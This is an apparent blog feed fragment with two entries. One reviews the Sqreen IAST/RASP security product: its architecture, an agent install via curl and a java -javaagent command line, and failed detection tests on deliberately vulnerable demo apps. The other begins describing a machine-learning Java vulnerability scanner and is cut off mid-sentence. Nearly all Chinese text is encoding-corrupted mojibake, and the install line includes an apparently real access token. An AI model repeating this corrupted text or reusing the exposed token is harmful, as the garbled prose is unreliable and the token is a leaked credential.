    <content type="html"><![CDATA[<p><a href="https://www.sqreen.com/" target="_blank" rel="noopener">Sqreen</a> ä½œä¸ºä¸€æ¬¾IASTäº§å“ï¼Œç”¨æˆ·åœ¨é¡¹ç›®ä¸­å¯¼å…¥ä»–ä»¬çš„agentï¼Œä¹‹åå¯åœ¨æ§åˆ¶å°æŸ¥çœ‹æ£€æµ‹åˆ°çš„å®‰å…¨é£é™©ï¼Œå¹¶è¿›è¡Œé˜²å¾¡ï¼ˆRASPï¼‰ã€‚</p><h1 id="æŠ€æœ¯ä»‹ç»"><a href="#æŠ€æœ¯ä»‹ç»" class="headerlink" title="æŠ€æœ¯ä»‹ç»"></a>æŠ€æœ¯ä»‹ç»</h1><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒSqreenä¸»è¦ç”±ä¸‰ä¸ªç»„ä»¶ç»„æˆï¼ŒMicroAgentã€Security Engineå’ŒSqreen Platformï¼ŒSecurity Engineéƒ¨ç½²äºMicroAgentå†…éƒ¨ï¼Œå¼€å‘è€…åªè¦åœ¨å¯åŠ¨åº”ç”¨æ—¶å€’å…¥MicroAgentå³å¯ï¼ŒPlatformä¸»è¦ç”¨äºæ¥æ”¶Agentä¿¡æ¯å¹¶ä¸”å¯è§†åŒ–ç»™ç”¨æˆ·ã€‚</p><a id="more"></a><p><img src="/iast-Sqreenåˆæ¢/how-it-works-together-1.png" alt="img"></p><p>å¯è§MicroAgentæ˜¯å…¶ä¸»è¦éƒ¨ä»¶ï¼Œä¸»è¦æœ‰ä»¥ä¸‹åŠŸèƒ½ï¼š</p><ul><li>åŠ¨æ€æ’æ¡©</li><li>ç›‘æ§ç¨‹åºå¹¶æ”¶é›†ä¿¡æ¯</li><li>æ ¹æ®å®‰å…¨å¼•æ“æŒ‡ç¤ºæ‰§è¡Œå®‰å…¨å“åº”</li><li>ä¸Platformé€šä¿¡</li></ul><h1 id="é˜²å¾¡æŠ€æœ¯"><a href="#é˜²å¾¡æŠ€æœ¯" class="headerlink" title="é˜²å¾¡æŠ€æœ¯"></a>é˜²å¾¡æŠ€æœ¯</h1><p>ä»ä¸‹å›¾å¯ä»¥çœ‹åˆ°Sqreenä½¿ç”¨å¤šå±‚æ¬¡ä¿æŠ¤åº”ç”¨ç¨‹åºï¼Œè¿™é‡Œä¸»è¦ä»‹ç»In-App WAF å’Œ RASPã€‚</p><p><img src="/iast-Sqreenåˆæ¢/defense-in-depth.png" alt="img"></p><h2 id="In-App-WAF"><a href="#In-App-WAF" class="headerlink" title="In-App WAF"></a>In-App WAF</h2><p>åº”ç”¨å†…WAFæ˜¯ç¬¬ä¸€é“é˜²çº¿ï¼Œå’Œå¤–éƒ¨é˜²ç«å¢™ä¸€æ ·ï¼Œä¸»è¦é€šè¿‡æ¨¡å¼åŒ¹é…æ¥æ£€æµ‹å’Œé˜»æ­¢æ¶æ„æµé‡ï¼Œä½†ä¸å¤–éƒ¨WAFä¸åŒçš„æ˜¯ï¼Œåº”ç”¨å†…WAFå¯ä»¥æ ¹æ®å½“å‰åº”ç”¨çš„æ•°æ®åº“ã€æ¡†æ¶å’Œç¼–ç¨‹è¯­è¨€åº”ç”¨ä¸åŒçš„è§„åˆ™ï¼Œæé«˜æ•ˆç‡ã€‚</p><p>å¦‚ä¸‹å›¾ï¼Œåœ¨æ–°å»ºä¸€ä¸ªè§„åˆ™æ—¶ï¼Œå¯ä»¥é€‰æ‹©åŒ¹é…æŠ¥æ–‡çš„å“ªäº›å­—æ®µï¼ˆå…¶å®æ„Ÿè§‰è·Ÿå¤–éƒ¨WAFä¸€æ ·ï¼‰</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604191023036.png" alt="image-20200604191023036"></p><p>æ¥ç€å¯ä»¥é€‰æ‹©å¯¹å­—æ®µçš„åŒ¹é…è§„åˆ™</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604191224862.png" alt="image-20200604191224862"></p><p>å…¶ä¸­hasSQLinjectionå’ŒhasXSSinjectionè¿™ä¸¤ä¸ªå®é™…ä¸Šæ˜¯é¢„å®šä¹‰çš„æ­£åˆ™ï¼Œç±»ä¼¼ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604192113549.png" alt="image-20200604192113549"></p><p>ä¸‹å›¾å¯ä»¥çœ‹å‡º<strong>In-App WAFä¸å¤–éƒ¨WAFçš„åŒºåˆ«</strong>ï¼Œå³ä¸æœ¬åº”ç”¨æ— å…³çš„å…¶ä»–æŠ€æœ¯è¢«Disabledï¼š</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604191940016.png" alt="image-20200604191940016"></p><h2 id="RASP-Runtime-Application-Self-Protection"><a href="#RASP-Runtime-Application-Self-Protection" class="headerlink" title="RASP(Runtime Application Self-Protection)"></a>RASP(Runtime Application Self-Protection)</h2><p>RASPæ˜¯å­˜åœ¨å¾ˆä¹…çš„æ¦‚å¿µäº†ï¼ˆç›®å‰è¿˜æ²¡æ·±å…¥å­¦ä¹ ï¼ŒåæœŸä¼šè¡¥ä¸ŠæŠ€æœ¯åŸç†ï¼‰ï¼Œè¿™é‡Œç³»ç»Ÿæ”¯æŒä»¥ä¸‹æ¼æ´çš„é˜²å¾¡ï¼š</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604171427705.png" alt="image-20200604171427705"></p><h2 id="In-App-WAF-v-s-RASP"><a href="#In-App-WAF-v-s-RASP" class="headerlink" title="In-App WAF v.s. RASP"></a>In-App WAF v.s. RASP</h2><p>ä»æŠ€æœ¯åŸç†ä¸Šå¯ä»¥çœ‹åˆ°ä¸¤è€…çš„åŒºåˆ«ï¼ŒIn-App WAFæœ¬è´¨è¿˜æ˜¯WAFï¼Œé€šè¿‡æ­£åˆ™è§„åˆ™åŒ¹é…æ‹¦æˆªæ¶æ„æµé‡ï¼Œè€ŒRASPåˆ™æ˜¯hookäº†å…³é”®apiï¼Œé€šè¿‡åŠ¨æ€æ±¡ç‚¹åˆ†æç­‰æ–¹å¼å®ç°é«˜ç²¾åº¦çš„é˜²å¾¡ã€‚</p><h1 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h1><ol><li><p>ç”³è¯·é€‚ç”¨åï¼Œç‚¹å‡»â€œConnect a new applicationâ€ï¼š</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604164240814.png" alt="image-20200604164240814"></p></li><li><p>è¿›å…¥éƒ¨ç½²å¼•å¯¼ç•Œé¢ï¼Œé€‰æ‹©è¯­è¨€å’Œé¡¹ç›®åç§°ï¼Œç‚¹å‡»â€œshow instructionsâ€åå¯ä»¥çœ‹åˆ°éƒ¨ç½²çš„java agentï¼š</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604164525671.png" alt="image-20200604164525671"></p><p>æŒ‰å³ä¾§æŒ‡ç¤ºæ“ä½œå³å¯ï¼ŒåŒæ—¶å¯ä»¥çœ‹åˆ°å¯¹äºjavaæ˜¯ä½¿ç”¨javaagentå®ç°çš„ï¼Œä¼°è®¡æ˜¯hookäº†ä¸€äº›å‡½æ•°ã€‚</p></li><li><p>å¯¹äºJavaé¡¹ç›®ï¼Œä¸‹è½½agentï¼Œå¹¶åŠ å‚æ•°é‡å¯åº”ç”¨ï¼ˆäº§å“ä¸Šçº¿æ—¶å¯ä»¥ç”¨SDKé›†æˆçš„æ–¹æ¡ˆï¼Œè¯¦æƒ…è§<a href="https://docs.sqreen.com/java/user-monitoring/" target="_blank" rel="noopener">https://docs.sqreen.com/java/user-monitoring/</a>ï¼‰ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://download.sqreen.com/java/sqreen.jar -o sqreen.jar</span><br><span class="line">java -javaagent:sqreen.jar -Dsqreen.token=env_org_dd05c0b8eb3317bbbc7857420ec86abe2ea5aa347ffc6c3efc8ef060 -Dsqreen.app_name=JavaDemo -jar java-sec-code-1.0.0.jar</span><br></pre></td></tr></table></figure></li></ol><pre><code>å¯ä»¥çœ‹åˆ°Webé¡µé¢æœ€ä¸‹é¢ï¼Œæœ‰åº”ç”¨ä¸Šçº¿äº†ï¼š![image-20200604170231764](iast-Sqreenåˆæ¢/image-20200604170231764.png)</code></pre><h1 id="è¯•ç”¨ç»“æœ"><a href="#è¯•ç”¨ç»“æœ" class="headerlink" title="è¯•ç”¨ç»“æœ"></a>è¯•ç”¨ç»“æœ</h1><p>Javaæ–¹é¢å°è¯•äº†ä¸€ä¸‹<a href="https://github.com/JoyChou93/java-sec-code" target="_blank" rel="noopener">JavaSecCode</a>ï¼Œåå°„å‹/å­˜å‚¨å‹XSSã€SQLiã€å‘½ä»¤æ³¨å…¥ã€XXEéƒ½æ²¡èƒ½æ£€æµ‹åˆ°ï¼Œä¼°è®¡æ˜¯WAFé‚£è¾¹ä¼°è®¡æ˜¯è§„åˆ™é—®é¢˜ï¼ŒRASPå› ä¸ºæ–‡æ¡£é‡Œæ²¡æœ‰ä»‹ç»å…·ä½“åŸç†ï¼Œä¸å¥½ç»™å‡ºè§£é‡Šã€‚</p><p>Nodejsæ–¹é¢åŸæœ¬æƒ³å°è¯•ç”¨<a href="https://github.com/Anemone95/NodeSecCode" target="_blank" rel="noopener">NodeSecCode</a>è¯•ä¸€ä¸‹çš„ï¼Œä½†æ˜¯æµ‹è¯•å‘ç°Sqreenå¹¶ä¸æ”¯æŒeggæ¡†æ¶ï¼Œåœ¨app.jsåŠ å…¥requireåä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">It seems that the following modules have been required before Sqreen:</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/debug/src/index.js</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/graceful-process/index.js</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/egg-logger/index.js</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/egg/index.js</span><br><span class="line">Sqreen may not be able to protect the whole application.</span><br><span class="line">If you think this is an error, please report it to Sqreen team.</span><br><span class="line">Read more on https://doc.sqreen.io/docs/nodejs-agent-installation</span><br></pre></td></tr></table></figure><p>äºæ˜¯æ‰‹å†™ä¸€ç®€å•çš„expressæœåŠ¡ï¼Œå«ä¸€ä¸ªåå°„xssä»£ç ï¼ŒSqreenAgentå¯ä»¥æˆåŠŸéƒ¨ç½²ï¼Œä½†æ˜¯ä»æ²¡æœ‰å‘ç°è¯¥æ¼æ´ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>Sqreen ä¸»è¦åˆ©ç”¨åŠ¨æ€æ’æ¡©æŠ€æœ¯å®ç°äº†IASTï¼Œä½†æ˜¯å®é™…æµ‹è¯•æ¥çœ‹æ•ˆæœå¹¶ä¸æ˜¯å¾ˆå¥½ï¼ˆä¸è®ºJavaè¿˜æ˜¯Nodejséƒ½æ²¡æœ‰å‘ç°æ¼æ´ï¼‰ï¼Œå®˜æ–¹æ¨èæ˜¯é…åˆ<a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">Nikto</a>è¿›è¡Œæ‰«æï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæœ¬äº§å“ç”±äºè§„åˆ™å’Œè®¾è®¡ç­‰åŸå› ï¼Œè¿˜æ˜¯éœ€è¦ç»“åˆä¼ ç»Ÿé»‘ç›’æ‰«æçš„çˆ¬è™«æˆ–Payloadæ‰èƒ½æœ‰æ•ˆæœã€‚</p><h1 id="ç›¸å…³èµ„æ–™"><a href="#ç›¸å…³èµ„æ–™" class="headerlink" title="ç›¸å…³èµ„æ–™"></a>ç›¸å…³èµ„æ–™</h1><ul><li><p>Sqreenå®˜æ–¹æ–‡æ¡£ï¼Œ<a href="https://docs.sqreen.com/" target="_blank" rel="noopener">https://docs.sqreen.com/</a></p></li><li><p>Sqreen GitHubï¼Œ<a href="https://github.com/sqreen" target="_blank" rel="noopener">https://github.com/sqreen</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.sqreen.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Sqreen&lt;/a&gt; ä½œä¸ºä¸€æ¬¾IASTäº§å“ï¼Œç”¨æˆ·åœ¨é¡¹ç›®ä¸­å¯¼å…¥ä»–ä»¬çš„agentï¼Œä¹‹åå¯åœ¨æ§åˆ¶å°æŸ¥çœ‹æ£€æµ‹åˆ°çš„å®‰å…¨é£é™©ï¼Œå¹¶è¿›è¡Œé˜²å¾¡ï¼ˆRASPï¼‰ã€‚&lt;/p&gt;&lt;h1 id=&quot;æŠ€æœ¯ä»‹ç»&quot;&gt;&lt;a href=&quot;#æŠ€æœ¯ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;æŠ€æœ¯ä»‹ç»&quot;&gt;&lt;/a&gt;æŠ€æœ¯ä»‹ç»&lt;/h1&gt;&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒSqreenä¸»è¦ç”±ä¸‰ä¸ªç»„ä»¶ç»„æˆï¼ŒMicroAgentã€Security Engineå’ŒSqreen Platformï¼ŒSecurity Engineéƒ¨ç½²äºMicroAgentå†…éƒ¨ï¼Œå¼€å‘è€…åªè¦åœ¨å¯åŠ¨åº”ç”¨æ—¶å€’å…¥MicroAgentå³å¯ï¼ŒPlatformä¸»è¦ç”¨äºæ¥æ”¶Agentä¿¡æ¯å¹¶ä¸”å¯è§†åŒ–ç»™ç”¨æˆ·ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="IAST" scheme="http://anemone.top/categories/IAST/"/>
    
    
      <category term="IAST" scheme="http://anemone.top/tags/IAST/"/>
    
      <category term="RASP" scheme="http://anemone.top/tags/RASP/"/>
    
  </entry>
  
  <entry>
    <title>æ¯•è®¾ï¼šåŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ</title>
    <link href="http://anemone.top/whitebox-%E6%AF%95%E8%AE%BE%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84Java%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%B3%BB%E7%BB%9F/"/>
    <id>http://anemone.top/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/</id>
    <published>2020-05-28T12:30:49.000Z</published>
    <updated>2020-05-28T11:45:51.032Z</updated>
    
    <content type="html"><![CDATA[<p><strong>æœ¬æ–‡é¦–æ¬¡å‘è¡¨åœ¨<a href="https://www.toutiao.com/i6826913540683596300/" target="_blank" rel="noopener">æ…•æµ‹å¤´æ¡å…¬ä¼—å·</a>ï¼Œè¿™é‡Œåªä½œå½’æ¡£ç”¨</strong></p><h1 id="èƒŒæ™¯æ„ä¹‰"><a href="#èƒŒæ™¯æ„ä¹‰" class="headerlink" title="èƒŒæ™¯æ„ä¹‰"></a>èƒŒæ™¯æ„ä¹‰</h1><p>éšç€äººä»¬å¯¹è½¯ä»¶å®‰å…¨çš„ä¸æ–­é‡è§†ï¼Œé™æ€å®‰å…¨æ‰«æç³»ç»Ÿè¢«éƒ¨ç½²äºå¼€å‘æµç¨‹ã€‚ç›¸å¯¹äºå…¶ä»–ä¼ ç»Ÿåˆ†ææ–¹æ³•ï¼Œæ±¡ç‚¹åˆ†ææŠ€æœ¯ç”±äºå…·æœ‰è¾ƒé«˜çš„å¯è§£é‡Šæ€§å’Œå‡†ç¡®æ€§ï¼Œç›®å‰ä½œä¸ºæŒ–æ˜ Web æ¼æ´çš„å¸¸ç”¨æŠ€æœ¯ï¼Œå¹¿æ³›åº”ç”¨äºå¼€æºå’Œå•†ç”¨æ‰«æå™¨ä¸­ã€‚</p><p>ç„¶è€Œï¼Œæ±¡ç‚¹åˆ†ææ–¹æ³•å­˜åœ¨ç§ç§ä¸è¶³ã€‚é¦–å…ˆï¼Œæ±¡ç‚¹åˆ†ææ— æ³•å¤„ç†å®¹å™¨ç±»å‹ï¼Œé™æ€æ±¡ç‚¹åˆ†æåªèƒ½å°†å®¹å™¨å˜é‡ï¼ˆå¦‚Mapã€Listå˜é‡ï¼‰çš„ä¼ æ’­è§„åˆ™è®¾ä¸ºä¼ æ’­/ä¸ä¼ æ’­æ±¡ç‚¹ï¼Œé€ æˆè¿‡æ±¡æŸ“/æ¬ æ±¡æŸ“ï¼›å…¶æ¬¡ï¼Œæ±¡ç‚¹åˆ†ææ— æ³•å¤„ç†æ§åˆ¶æµï¼Œæ±¡ç‚¹åˆ†æå¹¶ä¸èƒ½è¯†åˆ«ç”¨äºæ£€æŸ¥æ•°æ®æ˜¯å¦åˆæ³•çš„åˆ†æ”¯è¯­å¥ï¼Œå¯¼è‡´è¯¯æŠ¥ï¼›æœ€åï¼Œæ±¡ç‚¹åˆ†ææ— æ³•å¤„ç†ç‰¹æ®Šçš„ä¼ æ’­æ¡ä»¶ï¼Œå¦‚SSRFæ¼æ´è¦æ±‚æ”»å‡»è€…èƒ½æ“çºµåŸŸåï¼Œè‹¥æ±¡ç‚¹æ‹¼æ¥åœ¨URLå‚æ•°éƒ¨åˆ†ï¼Œåˆ™ä»£ç ä¸å­˜åœ¨æ¼æ´ï¼Œè€Œæ±¡ç‚¹åˆ†æä»ä¼šæŠ¥å‘Šæ¼æ´ã€‚ä¸ºè§£å†³è¿™äº›é—®é¢˜ï¼Œç›®å‰å®‰å…¨å·¥ç¨‹å¸ˆåªæœ‰æ‰‹åŠ¨è®¾è®¡ç²¾å·§çš„è§„åˆ™ï¼Œå¯å³ä½¿è¿™æ ·ä»ä¼šäº§ç”Ÿå¤§é‡è¯¯æŠ¥ç”šè‡³æ¼æŠ¥ã€‚</p><a id="more"></a><p>ä¸ºè§£å†³ä¼ ç»Ÿåˆ†ææ–¹æ³•é«˜è¯¯æŠ¥ã€éœ€è¦èŠ±å¤§é‡äººåŠ›å®šä¹‰è§„åˆ™ç­‰é—®é¢˜ï¼Œéšç€æœºå™¨å­¦ä¹ é¢†åŸŸçš„ä¸æ–­å‘å±•ï¼Œå­¦æœ¯ç•Œä¸€ç›´åœ¨æ¢ç´¢æœºå™¨å­¦ä¹ åœ¨é™æ€å®‰å…¨æ‰«æä¸Šçš„åº”ç”¨ã€‚æçç­‰å­¦è€…ä½¿ç”¨åå‘ç¨‹åºåˆ‡ç‰‡ç»“åˆBLSTMç¥ç»ç½‘ç»œè¿›è¡Œæ¼æ´æŒ–æ˜[1]ï¼Œç„¶è€Œä»–ä»¬çš„å·¥å…·åªèƒ½ç”¨äºC/C++ç¼–å†™çš„è½¯ä»¶ï¼ŒKoc ç­‰å­¦è€…æå‡ºä½¿ç”¨ç±»ä¼¼æŠ€æœ¯å¯¹Javaä»£ç æ¼æ´è¿›è¡Œè¿‡æ»¤[2,3]ï¼Œé€šè¿‡é¢„æµ‹è¯¯æŠ¥æé«˜æ‰«æç»“æœå‡†ç¡®æ€§ï¼Œå®éªŒè¯æ˜è¯¥å·¥å…·å…·æœ‰å¾ˆå¥½çš„æ•ˆæœï¼Œç„¶è€Œç”±äºä¼ ç»Ÿç¨‹åºåˆ‡ç‰‡è¿‡äºè€—æ—¶ï¼Œå…¶å·¥ä½œåªèƒ½å¯¹æ±¡ç‚¹ä¼ æ’­çš„æœ€åä¸€æ®µå‡½æ•°ä½“è¿›è¡Œåˆ‡ç‰‡ï¼Œæ±¡ç‚¹ä¼ æ’­æ˜¯å¦èƒ½å¤Ÿä¼ æ’­å¹¶ä¸ç­‰ä»·äºæ±¡ç‚¹æ˜¯å¦èƒ½å¤Ÿåœ¨æ±‡èšç‚¹ä¼ æ’­ï¼Œå› æ­¤ä»–ä»¬çš„å·¥ä½œæ— æ³•ç”¨äºå®é™…åœºæ™¯ã€‚</p><p>å¯è§ï¼Œä¸€æ¬¾å®é™…å¯ç”¨çš„åŸºäºæœºå™¨å­¦ä¹ çš„Javaé™æ€æ¼æ´æ‰«æç³»ç»Ÿèƒ½æœ‰æ•ˆå‡è½»å·¥ç¨‹å¸ˆå·¥ä½œé‡ï¼Œåœ¨å¿«é€Ÿå¼€å‘è½¯ä»¶çš„åŒæ—¶ä¿è¯è½¯ä»¶å®‰å…¨æ€§ã€‚</p><h1 id="ç³»ç»Ÿä»‹ç»"><a href="#ç³»ç»Ÿä»‹ç»" class="headerlink" title="ç³»ç»Ÿä»‹ç»"></a>ç³»ç»Ÿä»‹ç»</h1><p>æœ¬ç³»ç»Ÿç»“åˆæœ€æ–°å­¦æœ¯ç•Œæˆæœï¼Œé¢å‘ Web å¼€å‘å¸¸ç”¨çš„ Java è¯­è¨€ï¼Œåˆ©ç”¨æ±¡ç‚¹åˆ†æã€ç¨‹åºåˆ‡ç‰‡å’Œ BLSTM ä¸ºå¼€å‘æˆ–å®‰å…¨å·¥ç¨‹å¸ˆæä¾›æ›´å‡†ç¡®çš„ä»£ç æ‰«ææœåŠ¡ã€‚å…¶å·¥ä½œæµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå·¥ç¨‹å¸ˆåœ¨ç³»ç»Ÿä¸­æ–°å»ºæ‰«æé¡¹ç›®ï¼Œåœ¨é¡¹ç›®ä¸­æäº¤æºä»£ç å’ŒJaråŒ…ï¼›æ±¡ç‚¹åˆ†ææ¨¡å—å¯¹ Jar åŒ…è¿›è¡Œæ±¡ç‚¹åˆ†æï¼Œå¾—åˆ°æ±¡ç‚¹ä¼ æ’­æŠ¥å‘Šï¼Œæ±¡ç‚¹æŠ¥å‘Šä¸­åŒ…å«æœ‰æ¼æ´å®ä¾‹å’Œå¯¹åº”çš„æ±¡ç‚¹ä¼ æ’­æ ‘ï¼›ç¨‹åºåˆ‡ç‰‡æ¨¡å—å°†å¯¹ä¼ æ’­æ ‘åˆ†è§£ä¸ºæ±¡æŸ“æµï¼Œå¹¶å¯¹æ¯ä¸€æ±¡æŸ“æµè¿›è¡Œåˆ‡ç‰‡ï¼›æ•°æ®é¢„å¤„ç†æ¨¡å—å¯¹åˆ‡ç‰‡è¿›è¡Œæ³›åŒ–å’Œå‘é‡åŒ–å¤„ç†ï¼Œå¾—åˆ°åˆ‡ç‰‡çš„ç‰¹å¾å‘é‡ï¼›é¢„æµ‹æ¨¡å—é€šè¿‡BLSTMæ¨¡å‹å¯¹åˆ‡ç‰‡è¿›è¡Œé¢„æµ‹ï¼Œä»è€Œæ¨å¯¼æ¼æ´æ˜¯å¦ä¸ºè¯¯æŠ¥ï¼›è‡³æ­¤ï¼Œç³»ç»Ÿå°†æ›´ç²¾å‡†çš„æ¼æ´æŠ¥å‘Šè¿”å›è‡³ç”¨æˆ·ã€‚</p><p><img src="/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/overview169-1590658589087.png" alt="overview169"></p><p>åœ¨æ±¡ç‚¹ä¼ æ’­è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿå¯¹FindSecBugsçš„æ±¡ç‚¹åˆ†æè¿‡ç¨‹è¿›è¡Œæ”¹é€ ï¼Œä½¿å…¶åœ¨æŠ¥å‘Šä¸­è¿”å›æ±¡ç‚¹ä¼ æ’­æ ‘ï¼Œæ±¡ç‚¹ä¼ æ’­æ ‘è¡¨ç¤ºæ±¡ç‚¹çš„å”¯ä¸€ä¼ æ’­è·¯å¾„ï¼Œä¸ºç¨‹åºåˆ‡ç‰‡æä¾›ä¾æ®ã€‚ä¾‹å¦‚ï¼Œå¯¹äºä»£ç  1 æ¥è¯´ï¼Œåœ¨æ±¡ç‚¹ä¼ æ’­æŠ¥å‘Šä¸­è¿”å›å¦‚å›¾ 1æ‰€ç¤ºçš„ä¼ æ’­æ ‘ï¼Œå¯è§ä¼ æ’­æ ‘çš„æ ‘æ ¹ä¸ºæ±¡ç‚¹å…¥å£å‡½æ•°ä¸Šä¸‹æ–‡ï¼Œå¶å­èŠ‚ç‚¹ä¸ºå‡½æ•°è°ƒç”¨æˆ–è¿”å›è¯­å¥ï¼Œä¸”å¶å­èŠ‚ç‚¹å­˜åœ¨é¡ºåºï¼Œä¸”ç»ˆæ­¢äºæ±‡èšç‚¹ï¼Œæ³¨æ„å°½ç®¡ä»£ç ä¸­å­˜åœ¨ifåˆ†æ”¯ï¼Œä½†æœ‰çš„åˆ†æ”¯è¿”å›è¯­å¥ä¸æ±¡ç‚¹æ— å…³ï¼Œå› æ­¤æœ€ç»ˆåªæœ‰ä¸€ä¸ªæ±¡ç‚¹ä¼ æ’­æ ‘ã€‚</p><p>åœ¨ç¨‹åºåˆ‡ç‰‡è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿå¯¹æ±¡ç‚¹åˆ†ææŠ¥å‘Šä¸­çš„æ¼æ´å®ä¾‹è¿›è¡Œåˆ‡ç‰‡ï¼Œä¸ºè§£å†³åˆ‡ç‰‡è§„æ¨¡å·¨å¤§é€ æˆæ‰«ææ—¶é—´è¿‡é•¿ç”šè‡³æ‰«æå¤±è´¥çš„é—®é¢˜ï¼Œåœ¨åˆ‡ç‰‡å‰ï¼Œç³»ç»Ÿé€šè¿‡é™åˆ¶è°ƒç”¨å›¾èŠ‚ç‚¹ä¸ªæ•°ä¿è¯åˆ‡ç‰‡å¿«é€Ÿå®Œæˆï¼›åŒæ—¶ï¼Œä¸ºä¿è¯åˆ‡ç‰‡è¦†ç›–æ±¡ç‚¹ä¼ æ’­å…¨é˜¶æ®µï¼Œç³»ç»Ÿå¯¹ä¸€ä¸ªæ¼æ´è¿›è¡Œåˆ†æ®µåˆ‡ç‰‡ï¼Œå¯¹äºä¸€ä¸ªæ¼æ´çš„æ¯ä¸€ä¼ æ’­æ ‘ï¼Œå°†å…¶æ‹†è§£ä¸ºæ±¡ç‚¹ä¼ æ’­ç‰‡æ®µï¼Œç”±â€œå‡½æ•°æ‘˜è¦â†’å…´è¶£ç‚¹è¡Œå·â€äºŒå…ƒç»„è¡¨ç¤ºï¼Œå†å¯¹æ¯ä¸ªç‰‡æ®µè¿›è¡Œåˆ‡ç‰‡ï¼Œä¾‹å¦‚å›¾ 1 çš„æ±¡ç‚¹ä¼ æ’­æ ‘ï¼Œå°†ä¼šäº§ç”Ÿ<strong>doGet()â†’line:5</strong>ã€<strong>filter()â†’line:13</strong>å’Œ<strong>sink()â†’line:17</strong> 3ä¸ªåˆ‡ç‰‡ã€‚</p><p><img src="/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/ä»£ç 1å’Œå›¾1.png" alt="ä»£ç 1å’Œå›¾1"></p><p>åœ¨é¢„å¤„ç†è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿå¯¹æ¯ä¸€åˆ‡ç‰‡è¿›è¡Œæ³›åŒ–å’Œå‘é‡åŒ–å¤„ç†ï¼Œå›¾ 4 å°†è¯´æ˜æ³›åŒ–è¿‡ç¨‹ï¼Œå›¾ä¸­å·¦ä¾§ä¸ºåŸå§‹åˆ‡ç‰‡è¾“å‡ºï¼Œå…¶æ¯è¡Œä»£è¡¨ä¸€ä¸ªSDGèŠ‚ç‚¹ï¼ŒSDGèŠ‚ç‚¹ç”±â€œåºå·ï¼šï¼šèŠ‚ç‚¹ç±»å‹ï¼šï¼šæŒ‡ä»¤ç±»å‹ï¼šï¼šè¿”å›å€¼ï¼šï¼šå…·ä½“å†…å®¹â€æ„æˆï¼Œé¢„å¤„ç†è¿‡ç¨‹ä¿ç•™èŠ‚ç‚¹ç±»å‹ã€æŒ‡ä»¤ç±»å‹å’Œå…·ä½“å†…å®¹ï¼Œå¹¶å¯¹åˆ‡ç‰‡ä¸­æ•°å­—å¸¸é‡ã€å­—ç¬¦ä¸²å¸¸é‡ã€å˜é‡ã€å‡½æ•°è°ƒç”¨å’Œç±»åæ–¹æ³•åè¿›è¡ŒæŠ½è±¡ï¼Œç»è¿‡æ³›åŒ–ååˆ‡ç‰‡å¦‚å³ä¾§æ‰€ç¤ºã€‚å‘é‡åŒ–è¿‡ç¨‹å°†æ³›åŒ–åçš„å•è¯åºåˆ—è½¬åŒ–ä¸ºæ•°å­—å‘é‡ï¼Œç”¨äºä¼ å…¥ç¥ç»ç½‘ç»œã€‚</p><p><img src="/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/image-20200528173120092.png" alt="image-20200528173120092"></p><p>åœ¨è¯¯æŠ¥é¢„æµ‹è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿé¦–å…ˆé€šè¿‡BLSTMç¥ç»ç½‘ç»œé¢„æµ‹æ¯ä¸€æ±¡ç‚¹ä¼ æ’­ç‰‡æ®µæ˜¯å¦å¯ä»¥ä¼ æ’­æ±¡ç‚¹ï¼Œå†é€šè¿‡æ±¡ç‚¹ä¼ æ’­è§„åˆ™æ¨å¯¼æ¼æ´æ˜¯å¦ä¸ºè¯¯æŠ¥ï¼Œå³ï¼šè‹¥ä¼ æ’­æ ‘ä¸­å›½ä»»æ„ä¸€ä¸ªé˜¶æ®µä¸èƒ½ä¼ æ’­æ±¡ç‚¹ï¼Œé‚£ä¹ˆè¯¥ä¼ æ’­æ ‘æ— 